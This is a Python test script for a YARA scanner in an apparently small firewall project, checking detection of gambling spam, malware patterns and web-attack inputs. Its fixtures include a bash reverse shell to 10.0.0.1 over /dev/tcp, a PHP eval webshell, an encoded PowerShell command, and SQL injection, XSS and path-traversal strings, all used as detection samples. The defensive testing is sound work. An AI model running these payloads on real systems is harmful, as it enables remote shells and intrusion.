#!/usr/bin/env python3
"""
YARA Scanner Test
Test YARA rules and scanner functionality.

Usage:
    python3 testing/test_yara_scanner.py
"""
import sys
from pathlib import Path

# Add app to path
script_dir = Path(__file__).parent.parent
sys.path.insert(0, str(script_dir / 'app'))

try:
    from minifw_ai.utils.yara_scanner import YARAScanner, get_yara_scanner
except ImportError as e:
    print(f"ERROR: {e}")
    print("\nYARA scanner requires yara-python")
    print("Install with: pip install yara-python")
    sys.exit(1)


def test_rule_compilation():
    """Test 1: Rule compilation."""
    print("\n[TEST 1] YARA Rule Compilation")
    print("=" * 60)
    
    rules_dir = script_dir / 'yara_rules'
    
    if not rules_dir.exists():
        print(f"❌ FAIL: Rules directory not found: {rules_dir}")
        return False
    
    print(f"Rules directory: {rules_dir}")
    
    try:
        scanner = YARAScanner(rules_dir=str(rules_dir))
        
        if not scanner.rules_loaded:
            print("❌ FAIL: Rules not loaded")
            return False
        
        print("✓ Rules compiled successfully")
        
        stats = scanner.get_stats()
        print(f"\nScanner Stats:")
        print(f"  Rules loaded: {stats['rules_loaded']}")
        print(f"  Rules directory: {stats['rules_dir']}")
        
        return True
        
    except Exception as e:
        print(f"❌ FAIL: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_gambling_detection():
    """Test 2: Gambling keyword detection."""
    print("\n[TEST 2] Gambling Detection")
    print("=" * 60)
    
    scanner = get_yara_scanner(rules_dir=str(script_dir / 'yara_rules'))
    
    # Test payloads
    test_cases = [
        {
            'name': 'Slot Gacor Keywords',
            'payload': 'Situs slot gacor terpercaya dengan bonus new member 100%',
            'expected_match': True
        },
        {
            'name': 'Togel Keywords',
            'payload': 'Togel online Singapore hongkong sidney bandar togel terpercaya',
            'expected_match': True
        },
        {
            'name': 'Casino Keywords',
            'payload': 'Live casino online Indonesia dengan permainan roulette dan blackjack',
            'expected_match': True
        },
        {
            'name': 'Normal Content',
            'payload': 'Welcome to our website. We offer professional services.',
            'expected_match': False
        }
    ]
    
    passed = 0
    failed = 0
    
    for case in test_cases:
        print(f"\n  Test: {case['name']}")
        print(f"  Payload: {case['payload'][:50]}...")
        
        matches = scanner.scan_payload(case['payload'])
        has_match = len(matches) > 0
        
        if has_match == case['expected_match']:
            print(f"  ✓ PASS - {'Match' if has_match else 'No match'} as expected")
            if matches:
                print(f"    Matched rules: {[m.rule for m in matches]}")
            passed += 1
        else:
            print(f"  ✗ FAIL - Expected {'match' if case['expected_match'] else 'no match'}, got {'match' if has_match else 'no match'}")
            failed += 1
    
    print(f"\n  Results: {passed} passed, {failed} failed")
    return failed == 0


def test_malware_detection():
    """Test 3: Malware pattern detection."""
    print("\n[TEST 3] Malware Detection")
    print("=" * 60)
    
    scanner = get_yara_scanner()
    
    test_cases = [
        {
            'name': 'PowerShell Encoded Command',
            'payload': 'powershell -enc aGVsbG8gd29ybGQ=',
            'expected_category': 'malware'
        },
        {
            'name': 'Webshell Pattern',
            'payload': '<?php eval($_POST["cmd"]); ?>',
            'expected_category': 'malware'
        },
        {
            'name': 'Reverse Shell',
            'payload': 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
            'expected_category': 'malware'
        }
    ]
    
    passed = 0
    
    for case in test_cases:
        print(f"\n  Test: {case['name']}")
        
        matches = scanner.scan_payload(case['payload'])
        
        if matches:
            match = matches[0]
            category = match.get_category()
            print(f"  ✓ Detected: {match.rule}")
            print(f"    Category: {category}")
            print(f"    Severity: {match.get_severity()}")
            
            if category == case['expected_category']:
                passed += 1
        else:
            print(f"  ✗ No match")
    
    print(f"\n  Matched: {passed}/{len(test_cases)}")
    return passed > 0


def test_api_abuse_detection():
    """Test 4: API abuse detection."""
    print("\n[TEST 4] API Abuse Detection")
    print("=" * 60)
    
    scanner = get_yara_scanner()
    
    test_cases = [
        {
            'name': 'SQL Injection',
            'payload': "username=' OR 1=1-- &password=test",
            'expected': 'api_abuse'
        },
        {
            'name': 'XSS Attempt',
            'payload': '<script>alert("XSS")</script>',
            'expected': 'api_abuse'
        },
        {
            'name': 'Path Traversal',
            'payload': '../../etc/passwd',
            'expected': 'api_abuse'
        }
    ]
    
    for case in test_cases:
        print(f"\n  Test: {case['name']}")
        
        matches = scanner.scan_payload(case['payload'])
        
        if matches:
            print(f"  ✓ Detected: {matches[0].rule}")
            print(f"    Category: {matches[0].get_category()}")
        else:
            print(f"  ✗ No match")


def test_match_evidence():
    """Test 5: Match evidence extraction."""
    print("\n[TEST 5] Evidence Extraction")
    print("=" * 60)
    
    scanner = get_yara_scanner()
    
    payload = "Slot gacor online deposit pulsa tanpa potongan bonus 100%"
    
    print(f"\nPayload: {payload}")
    
    matches = scanner.scan_payload(payload, return_strings=True)
    
    if not matches:
        print("❌ No matches found")
        return False
    
    print(f"\n✓ Found {len(matches)} match(es)")
    
    for match in matches:
        print(f"\nRule: {match.rule}")
        print(f"  Namespace: {match.namespace}")
        print(f"  Category: {match.get_category()}")
        print(f"  Severity: {match.get_severity()}")
        print(f"  Tags: {match.tags}")
        print(f"  Metadata: {match.meta}")
        print(f"  Matched strings: {len(match.strings)}")
        
        # Show first few matched strings
        for offset, identifier, data in match.strings[:3]:
            print(f"    [{offset}] {identifier}: {data}")
    
    return True


def test_performance():
    """Test 6: Performance test."""
    print("\n[TEST 6] Performance Test")
    print("=" * 60)
    
    import time
    
    scanner = get_yara_scanner()
    
    # Generate test payloads
    payloads = [
        "slot gacor" * 100,
        "normal content" * 100,
        "togel online" * 100,
    ]
    
    print(f"\nScanning {len(payloads)} payloads...")
    
    start = time.time()
    total_matches = 0
    
    for payload in payloads:
        matches = scanner.scan_payload(payload, timeout=10)
        total_matches += len(matches)
    
    elapsed = time.time() - start
    
    print(f"\n✓ Scanned {len(payloads)} payloads in {elapsed:.3f}s")
    print(f"  Average: {elapsed/len(payloads)*1000:.2f}ms per payload")
    print(f"  Total matches: {total_matches}")
    
    stats = scanner.get_stats()
    print(f"\nScanner Stats:")
    print(f"  Total scans: {stats['total_scans']}")
    print(f"  Total matches: {stats['total_matches']}")
    print(f"  Match rate: {stats['match_rate']:.2%}")
    
    return True


def main():
    """Main test runner."""
    print("=" * 60)
    print("MiniFW-AI YARA Scanner Test")
    print("=" * 60)
    
    tests = [
        ("Rule Compilation", test_rule_compilation),
        ("Gambling Detection", test_gambling_detection),
        ("Malware Detection", test_malware_detection),
        ("API Abuse Detection", test_api_abuse_detection),
        ("Evidence Extraction", test_match_evidence),
        ("Performance Test", test_performance),
    ]
    
    results = []
    
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"\n❌ TEST FAILED: {e}")
            import traceback
            traceback.print_exc()
            results.append((test_name, False))
    
    # Summary
    print("\n" + "=" * 60)
    print("TEST SUMMARY")
    print("=" * 60)
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for test_name, result in results:
        status = "✓ PASS" if result else "❌ FAIL"
        print(f"{status} - {test_name}")
    
    print(f"\nTotal: {passed}/{total} tests passed")
    
    if passed == total:
        print("\n✓ All tests passed!")
        sys.exit(0)
    else:
        print(f"\n❌ {total - passed} test(s) failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
